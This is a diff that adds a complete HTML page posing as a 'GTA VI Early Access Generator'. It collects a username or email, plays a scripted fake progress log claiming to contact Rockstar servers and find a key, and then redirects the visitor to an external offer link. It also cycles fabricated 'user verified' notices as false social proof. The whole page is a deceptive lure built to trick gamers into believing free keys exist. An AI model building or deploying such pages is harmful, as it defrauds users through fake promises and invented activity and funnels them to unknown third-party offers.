@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA VI Early Access Generator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body {
+            background: #0d0614 url('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?q=80&w=1600&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(13, 6, 20, 0.9), rgba(255, 0, 128, 0.2));
+            z-index: 1;
+        }
+
+        .card {
+            position: relative;
+            z-index: 2;
+            background: rgba(20, 15, 30, 0.85);
+            border: 1px solid rgba(255, 0, 128, 0.4);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 0 30px rgba(255, 0, 128, 0.3);
+            text-align: center;
+        }
+
+        .badge {
+            background: linear-gradient(90deg, #ff007f, #7928ca);
+            color: #fff;
+            padding: 6px 14px;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #ff80bf, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p.subtitle {
+            font-size: 14px;
+            color: #b3b3b3;
+            margin-bottom: 25px;
+        }
+
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .platform-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 13px;
+            transition: all 0.3s ease;
+        }
+
+        .platform-btn:hover, .platform-btn.active {
+            background: rgba(255, 0, 128, 0.2);
+            border-color: #ff007f;
+            box-shadow: 0 0 10px rgba(255, 0, 128, 0.4);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            text-align: center;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #00f2fe;
+        }
+
+        .cta-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #ff007f, #7928ca);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 0, 128, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 0, 128, 0.6);
+        }
+
+        /* Status & Console Log */
+        .status-box {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff007f, #00f2fe);
+            transition: width 0.4s ease;
+        }
+
+        .console-log {
+            font-family: monospace;
+            font-size: 12px;
+            color: #00f2fe;
+            height: 40px;
+            overflow: hidden;
+        }
+
+        .recent-activity {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="overlay"></div>
+
+    <div class="card">
+        <span class="badge">Limited Access</span>
+        <h1>Grand Theft Auto VI</h1>
+        <p class="subtitle">Select your platform and enter your ID to generate your early play key.</p>
+
+        <form id="generatorForm" onsubmit="startGenerator(event)">
+            <div class="platform-grid">
+                <button type="button" class="platform-btn active" onclick="selectPlatform(this)">PlayStation 5</button>
+                <button type="button" class="platform-btn" onclick="selectPlatform(this)">Xbox Series X/S</button>
+                <button type="button" class="platform-btn" onclick="selectPlatform(this)">PC (Windows)</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Enter Username or Email" required>
+            </div>
+
+            <button type="submit" class="cta-btn" id="submitBtn">Generate Key</button>
+        </form>
+
+        <div class="status-box" id="statusBox">
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="console-log" id="consoleLog">Connecting to Rockstar servers...</div>
+        </div>
+
+        <div class="recent-activity">
+            <span id="liveUser">User user_9934 verified 2 seconds ago</span>
+        </div>
+    </div>
+
+    <script>
+        const targetOfferUrl = "https://gta6cyberleekog.com/sl/1zy1x";
+
+        function selectPlatform(element) {
+            document.querySelectorAll('.platform-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+        }
+
+        function startGenerator(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            if(!username) return;
+
+            document.getElementById('submitBtn').style.display = 'none';
+            document.querySelectorAll('.platform-grid, .input-group').forEach(el => el.style.display = 'none');
+            
+            const statusBox = document.getElementById('statusBox');
+            const progressBar = document.getElementById('progressBar');
+            const consoleLog = document.getElementById('consoleLog');
+            statusBox.style.display = 'block';
+
+            const steps = [
+                { progress: 20, text: `Connecting to Rockstar server...` },
+                { progress: 45, text: `Searching access key for: ${username}...` },
+                { progress: 70, text: `Key found! Validating security token...` },
+                { progress: 90, text: `Finalizing activation process...` },
+                { progress: 100, text: `Verification Required! Redirecting...` }
+            ];
+
+            let stepIndex = 0;
+            const interval = setInterval(() => {
+                if (stepIndex < steps.length) {
+                    progressBar.style.width = steps[stepIndex].progress + '%';
+                    consoleLog.innerText = steps[stepIndex].text;
+                    stepIndex++;
+                } else {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        window.location.href = targetOfferUrl;
+                    }, 1000);
+                }
+            }, 1200);
+        }
+
+        // Live activity simulator
+        const usernames = ['Alex_99', 'GamerPro', 'VaporWave', 'NightHawk', 'Shadow_Rider'];
+        setInterval(() => {
+            const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
+            const randomSec = Math.floor(Math.random() * 10) + 1;
+            document.getElementById('liveUser').innerText = `User ${randomUser}*** verified ${randomSec} seconds ago`;
+        }, 4000);
+    </script>
+</body>
+</html>
